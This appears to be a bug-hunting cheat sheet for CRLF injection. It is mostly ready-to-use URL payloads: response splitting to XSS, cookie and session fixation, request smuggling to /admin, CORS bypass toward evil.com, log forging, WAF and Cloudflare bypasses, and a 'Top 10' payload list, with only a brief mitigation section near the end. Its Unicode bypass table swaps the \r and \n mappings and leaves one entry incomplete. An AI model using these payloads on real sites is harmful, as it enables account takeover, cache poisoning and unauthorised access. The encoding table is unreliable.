## 📌 Overview

**CRLF** = Carriage Return (`\r` / `%0D`) + Line Feed (`\n` / `%0A`)

These characters terminate lines in HTTP protocol. When injected into user input, they can:

- Split HTTP responses
- Inject headers
- Execute XSS
- Poison caches
- Enable session fixation
- Trigger request smuggling

**Key difference**: Windows/HTTP use `\r\n`, Linux uses only `\n`

---

## 🎯 Where to Find

- **Redirect parameters** → Look for 301/302/303/307/308 responses
- **Custom header values** → Any user input reflected in headers
- **URL paths** → Direct injection into request path
- **Query parameters** → `?lang=`, `?redirect=`, `?page=`, etc.
- **Error pages** → Parameters reflected in Location headers
- **Mobile versions** → Often different backend/parsing
- **APIs** → Header injection in REST/SOAP clients

---

## 🔥 Exploitation Methods

### **1. HTTP Response Splitting → XSS**

**How it works:**

1. Find reflected input in response headers
2. Inject double CRLF to split headers from body
3. Inject malicious HTML/JS in the new body

**Payload:**

```
/%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a<script>alert(document.domain)</script>
```

**Step-by-step:**

- Terminates original headers with `Content-Length: 0`
- Starts new fake response with `HTTP/1.1 200 OK`
- Sets `Content-Type: text/html` for browser parsing
- Injects XSS payload with exact byte count
- Browser ignores original server content

---

### **2. Cookie Injection**

**Basic:**

```
/%0D%0ASet-Cookie:admin=true
```

**With XSS bypass:**

```
/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```

**Effect:** Injects cookies into victim sessions, can lead to account takeover

---

### **3. Open Redirect Chain**

**Payloads:**

```
//www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
/www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
/google.com/%2F..%0D%0AHeader-Test:test2
/%0d%0aLocation:%20http://evil.com
```

---

### **4. Log Injection**

**Scenario:** Admin panel shows logs like `IP - Time - Path`

**Attack:**

```
/index.php?page=home&%0d%0a127.0.0.1%20-%2008:15%20-%20/admin?action=delete
```

**Result:** Fake log entry appears from localhost, hiding attacker actions

---

### **5. Session Fixation**

**Attack flow:**

1. Find CRLF in session parameter
2. Craft URL with fixed session cookie
3. Send to victim → they authenticate
4. Attacker uses same session cookie

**Example (CVE-2017-5868):**

```
https://target.com/__session_start__/%0d%0aSet-Cookie:session=ATTACKER_CONTROLLED
```

---

### **6. Request Smuggling**

**Inject headers to keep connection alive:**

```
GET /%20HTTP/1.1%0d%0aHost:%20target.com%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1
```

**Then smuggle second request:**

```
GET /%20HTTP/1.1%0d%0aHost:%20target.com%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/admin%20HTTP/1.1%0d%0aHost:%20evil.com%0d%0a%0d%0a HTTP/1.1
```

---

### **7. Memcache Poisoning**

If app uses memcache without sanitization:

- Inject memcache commands via CRLF
- Poison cache to redirect users to attacker-controlled IPs
- Steal credentials sent to fake servers

---

### **8. CORS Bypass**

Inject headers to enable cross-origin access:

```
/%0d%0aAccess-Control-Allow-Origin:%20https://evil.com%0d%0aAccess-Control-Allow-Credentials:%20true
```

---

## 🛠️ Filter Bypasses

### **Unicode Encoding**

```
%E5%98%8A = %0A = \r
%E5%98%8D = %0D = \n
%E5%98%BE = %3E = >
%E5%98%BC = %3C = 
```

**Payload:**

```
%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert(innerHTML())%E5%98%BE
```

---

### **Alternative Unicode Line Terminators**

```
%E2%80%A8  → U+2028 LINE SEPARATOR
%E2%80%A9  → U+2029 PARAGRAPH SEPARATOR
%C2%85     → U+0085 NEXT LINE
```

**Why it works:** Java/Python/Go normalize these to `\n` during header parsing

---

### **Double Encoding**

```
%250D%250A
```

---

### **Mixed Encoding**

```
/%0A%E2%80%A8Set-Cookie:%20admin=true
```

---

### **Cloudflare Bypass**

```html
<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)">
```

---

### **Path Variations**

```
/%%0a0aSet-Cookie:test=1
/%23%0aSet-Cookie:test=1
/%3f%0dSet-Cookie:test=1
/%2e%2e%2f%0d%0aSet-Cookie:test=1
/%2F..%0d%0aSet-Cookie:test=1
/%u000aSet-Cookie:test=1
```

---

## 💣 Top 10 Modern Payloads

```
1. /%0D%0ASet-Cookie:admin=true

2. /%0d%0aLocation:%20https://evil.com

3. /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>

4. /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a<script>alert(document.domain)</script>

5. %E5%98%8A%E5%98%8DSet-Cookie:%20pwned=1

6. /%0d%0aContent-Type:text/html%0d%0aHTTP/1.1%20200%20OK%0d%0a%0d%0a<html><body><h1>Defaced</h1></body></html>

7. //evil.com/%2F%2E%2E%0D%0ASet-Cookie:session=hijacked

8. /%20HTTP/1.1%0d%0aHost:%20target.com%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/admin%20HTTP/1.1

9. /%0d%0aAccess-Control-Allow-Origin:%20*%0d%0aAccess-Control-Allow-Credentials:%20true

10. /%0A%E2%80%A8Content-Type:text/html%0A%E2%80%A8%0A%E2%80%A8<img%20src=x%20onerror=alert(1)>
```

---

## 🚨 Recent CVEs (2023-2025)

|**CVE**|**Component**|**Impact**|**Payload Example**|
|---|---|---|---|
|CVE-2024-45302|RestSharp|SSRF via header injection|`AddHeader("X-Foo","bar%0d%0aHost:evil")`|
|CVE-2024-51501|Refit|Request smuggling|`[Headers("X: a%0d%0aContent-Length:0%0d%0a%0d%0aGET /admin")]`|
|GHSA-4h3j-f5x9-r6x3|Apache APISIX|Open redirect + cache poison|`/login?redirect=%0d%0a<script>alert(1)</script>`|

---

## 🎓 Higher Impact Chains

### **CRLF → XSS → Account Takeover**

1. Inject XSS via CRLF
2. Steal session cookies
3. Hijack account

### **CRLF → Cache Poisoning → Stored XSS**

1. Inject malicious response
2. Poison CDN/proxy cache
3. Serve payload to all users

### **CRLF → Request Smuggling → Admin Access**

1. Keep connection alive
2. Smuggle request to `/admin`
3. Bypass authentication

### **CRLF → Memcache Injection → Credential Theft**

1. Inject memcache commands
2. Redirect users to attacker server
3. Capture plaintext credentials

---

## 🔧 Automated Tools

```bash
# CRLFsuite - Fast Go-based scanner
go install github.com/Raghavd3v/CRLFsuite@latest
crlfsuite -u https://target.com

# crlfuzz - Wordlist fuzzer with Unicode support
crlfuzz -u "https://target.com/FUZZ" -w wordlist.txt

# crlfmap - Multi-domain scanner
crlfmap scan --domains domains.txt --output results.txt

# crlfix - 2024 utility for Go programs
crlfix test --url https://target.com
```

---

## 🛡️ Detection Checklist

✅ **Test these locations:**

- Redirect parameters (`?redirect=`, `?url=`, `?next=`)
- Custom headers (`X-Forwarded-For`, `User-Agent`)
- Error pages with reflected input
- URL paths (`/path%0d%0a`)
- API endpoints (especially REST/SOAP clients)
- Mobile app backends

✅ **Look for responses with:**

- `Location:` headers
- `Set-Cookie:` headers
- 3xx status codes
- Reflected query parameters

✅ **Burp Suite workflow:**

1. Send to Repeater
2. Add `%0d%0aTest: injected` to parameter
3. Check response for `Test: injected` header
4. Escalate to full exploit

---

## 🚫 Mitigation

**For developers:**

1. **Never** put user input directly in response headers
2. **Encode** CR/LF characters: strip `\r`, `\n`, `%0d`, `%0a`
3. **Use framework functions** that prevent CRLF (e.g., modern PHP `header()`)
4. **Update** to latest language versions with built-in protections
5. **Validate** all redirects against whitelist
6. **Set** `Content-Security-Policy` headers

**Header encoding example (pseudo):**

```python
def safe_header(value):
    return value.replace('\r', '').replace('\n', '')
```

---

## 📚 Wordlist

[carlospolop/Auto_Wordlists - crlf.txt](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/crlf.txt)

---

## 🔗 References

- [Acunetix CRLF Guide](https://www.acunetix.com/websitesecurity/crlf-injection/)
- [PortSwigger Research - Response Queue Poisoning](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)
- [SonarSource - Memcache Injection](https://www.sonarsource.com/blog/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/)
- [Praetorian - Unicode Newline Bypass](https://security.praetorian.com/blog/2023-unicode-newlines-bypass/)
- [OWASP CRLF](https://owasp.org/www-community/vulnerabilities/CRLF_Injection)

---

**🎯 Pro tip:** Always test mobile versions—they often use different backends with weaker validation. Also check for UTF-8 normalization bypasses in modern WAFs.